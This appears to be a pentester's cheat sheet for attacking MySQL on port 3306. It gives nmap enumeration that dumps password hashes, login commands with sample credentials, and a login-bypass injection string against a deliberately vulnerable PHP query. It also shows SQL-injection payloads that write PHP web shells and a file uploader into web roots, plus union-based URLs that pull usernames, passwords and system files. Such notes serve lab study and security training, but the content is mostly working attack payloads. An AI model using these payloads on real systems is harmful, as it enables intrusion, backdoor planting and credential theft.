MySQL Port 3306

##### Enumeration

````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````

##### Connecting

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306

www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'sdfquelw0kly9jgbx92'
ERROR 1044 (42000): Access denied for user 'lavita'@'localhost' to database 'sdfquelw0kly9jgbx92'

www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'lavita' #  lavita db
MariaDB [lavita]> 
```

##### Commands

```sql
show databases;
show tables;
use db_name;
select * from passwords;
```

### Login

Try logging in as someone you know is a valid user, and with "%" as the password.

```php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

```bash
> admin' or 1=1-- -
```

#### Modifying Exploit

We found the webroot to be /var/www/html/. Note that I changed the query from the url to a header in a request, so at the end of the request, I put view=... I also changed it from a GET to a POST with "Content-Type: application/x-www-form-urlencoded".

From:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
```
To:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php”

#or for windows
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

Upload php command injection.

```bash
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file.

```bash
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

Inside URL:

```bash
http://192.168.11.35/comment.php?id=738 order by 1
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,5,6
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,@@version,6
# To!discover!the!current!user!being!used!for!the!database!connection:
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,user(),6
# View the tables
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
# Look into users table
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
# Extract username and password
http://192.168.11.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

##### Notes

- If you have a valid password, try using that same password for the admin accounts (root)